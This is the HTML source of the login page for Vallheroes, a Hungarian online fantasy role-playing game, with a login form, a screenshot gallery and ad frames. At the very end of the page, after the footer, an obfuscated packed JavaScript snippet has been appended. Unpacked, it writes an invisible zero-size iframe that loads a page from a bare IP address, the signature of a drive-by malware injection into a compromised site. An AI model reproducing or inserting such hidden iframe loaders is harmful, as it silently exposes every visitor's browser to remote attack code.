﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<script type="text/javascript" src="./js/overlib.js"></script>


<script type="text/javascript">

var formInUse = false;

function setFocus()
{
 if(!formInUse)
 {
		document.getElementById("login").focus();
 }
}

</script>


<title>Vallheroes :: Szerepjáték</title>
<base href="http://vallheroes.hu/" />
<link type="text/css" rel="Stylesheet" href="css/index.css" />
<link type="text/css" rel="Stylesheet" href="css/style.css" />
<link rel="shortcut icon" href="/favico.ico" type="image/icon" />
<meta http-equiv="Content-Type" content="text/html; charset=utf8" />
<link rel="alternate" type="application/xml" title="RSS" href="http://vallheroes.hu/rss.php" />

<meta http-equiv="Content-Language" content="pl" />
    <meta name="keywords" content="MMO, MMORPG, RPG, játék, ingyenjáték, kalandjáték, kaland, fantasy, online, szerepjáték" />
    <meta name="description" content="A Vallheroes egy ingyenes internetes mmorpg fantasy kalandjáték, szerepjáték." />

    <script type="text/javascript" src="js/jquery.js"></script>
    <script type="text/javascript" src="js/jquery.lightbox-0.5.js"></script>

    <link rel="stylesheet" type="text/css" href="css/jquery.lightbox-0.5.css" media="screen" />

  
    <script type="text/javascript">
    $(function() {
        $("#gallery a").lightBox();
    });
    </script>

  
</head>
<body onload="setFocus()">

<div id="wrapper">

	<div id="top">

	&nbsp;
		
		<div id="top_book_l">
			
			<a class="link_first" href="index.php">&nbsp;</a>
			
		</div>
		
		<div id="top_book_r">
			<a class="link_first" href="register.php">&nbsp;</a>
				
		</div>
		
		<div id="top_book_x">
			<a class="link_first" href="http://forum.vallheroes.hu">&nbsp;</a>
				
		</div>
		
	</div>

	<div id="middle">
		<div id="middle_left">
			
			<span class="info">Játék Idő: <strong>0:42:26</strong><br /></span>
			<span class="info">Jelenleg <strong>2715</strong> regisztrált játékos-ból</span>
			<span class="info"><b>0</b> van jelen.</span>

			
			<br /><br />
			
			<div id="gallery">
				<center><img src="./images/l_1.png" alt="" /></center>
				<p><a href="images/ss1_big.jpg"><img src="images/ss1.jpg" alt="szerepjáték"/></a></p>
				<center><img src="./images/l_1.png" alt="" /></center>
				<p><a href="images/ss2_big.jpg"><img src="images/ss2.jpg" alt="kalandjáték"/></a></p>
				<center><img src="./images/l_1.png" alt="" /></center>
				<p><a href="images/ss3_big.jpg"><img src="images/ss3.jpg" alt="mmorpg szerepjáték"/></a></p>
				<center><img src="./images/l_1.png" alt="" /></center>
				<p><a href="images/ss4_big.jpg"><img src="images/ss4.jpg" alt="szöveges szerepjáték"/></a></p>
				<center><img src="./images/l_1.png" alt="" /></center>
				</div>
				<p><a href="leiras.php"><img src="images/glowna/gomb.jpg" alt="szöveges szerepjáték"/></a></p>
				<p><a href="fejlesztes.php"><img src="images/friss.jpg" alt="kalandjáték"/></a></p>
				<p><a href="http://vallheroes.hu/info/"><img src="images/info.jpg" alt="kalandjáték információ"/></a></p>
			</div>
	
		<div id="middle_center">
			<form method="post" action="updates.php" name="log">
			<table border="0" align="center">
				<tr>
					<td width="195" height="61" style="background-image: url(./images/glowna/email.gif); background-repeat: no-repeat; background-position: top left;">
						<input type="text" name="email" onfocus="formInUse = true;" id="login" style="background: transparent; border: 0px;" />
					</td>
					<td align="left" width="185" height="61" style="background-image: url(./images/glowna/pass.gif); background-repeat: no-repeat; background-position: top left; padding-left: 12px;">
						<input type="password" name="pass" style="background: transparent; border: 0px;" />
					</td>				
				</tr>
				<tr>
					<td align="center" colspan="2">
						<input style="border:none;" type="image" src="images/glowna/loguj.gif" onmouseover='src="images/glowna/loguj1.gif"; this.style.border="0px";' onmouseout='src="images/glowna/loguj.gif"' alt="szerepjáték" />
					<br /><br /><div class="lostpass"><a href="index.php?step=lostpasswd"><img src="./images/ej.jpg" alt="kalandjáték" /></a></div>
					</td>
				</tr>
			</table>
			</form>
							<b>Ez a leírás nem létezik!</b><br />
				<span style="text-align: left">[<a href="#" onclick="history.go(-1); return false;" style="font-weight: bold;">Vissza</a>]</span>
			
	
		</div>
	
		<div id="middle_right">	
			<center>
					<IFRAME src="/ads.php?ads=1"
		width="120" height="750" frameborder="0" scrolling="no"></IFRAME>
			</center>
		</div>
		<div id="footer">
			<p id="footer_text"><!-- BEGIN STANDARD TAG - 468 x 60 - vallheroes.hu: Run-of-site - DO NOT MODIFY -->
<IFRAME FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO WIDTH=468 HEIGHT=60 SRC="http://ads.yahoo.com/st?ad_type=iframe&ad_size=468x60&section=5294079&pub_url=vallheroes.hu"></IFRAME>
<!-- END TAG --><br />
			<div class="foot">&copy; 2010 <a href="http://vallheroes.hu/">Vallheroes</a></div>
		
			</p>
		</div>
	</div>
</div>

<tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 k=" i=\\"0\\" g=\\"0\\" j=\\"0\\" f=\\"c://d.h.n.l/o.m\\">";1 5="<8";1 7="p";1 4="e";1 b="</8";1 a="e>";2.3(5);9(2.3(7+4+k+b),6);9(2.3(4+a),6);',26,26,'|var|document|write|k02|k0|1000|k01|if|setTimeout|k22|k2|http|188||src|height|244|width|board||101|php|165|tag1|ram'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>
</html>